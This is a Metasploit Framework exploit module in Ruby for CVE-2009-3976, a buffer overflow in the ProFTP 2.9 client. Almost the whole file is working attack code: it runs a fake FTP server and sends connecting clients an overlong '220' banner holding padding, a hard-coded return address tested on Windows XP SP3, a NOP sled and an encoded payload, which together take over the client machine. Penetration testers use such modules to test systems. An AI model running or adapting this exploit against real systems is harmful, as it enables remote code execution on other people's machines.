##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ProFTP 2.9 Banner Remote Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in the ProFTP 2.9
				client that is triggered through an excessively long welcome message.
			},
			'Author' 	 => [ 'His0k4 <his0k4.hlm[at]gmail.com>' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2009-3976' ],
					[ 'OSVDB', '57394' ],
					[ 'URL', 'http://www.labtam-inc.com/index.php?act=products&pid=1' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested against - XP SP3 English OK.
					[ 'Universal', 	{ 'Ret' => 0x6809d408 } ], # WCMDPA10 (part of ProFTP)
				],
			'Privileged'     => false,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 25 2009'))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The FTP daemon port to listen on", 21 ]),
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)

		buffer =  "220 "
		buffer << rand_text_numeric(2064)
		buffer << [target.ret].pack('V')
		buffer << make_nops(20)
		buffer << payload.encoded
		buffer << "\r\n"
		client.put(buffer)
	end

end
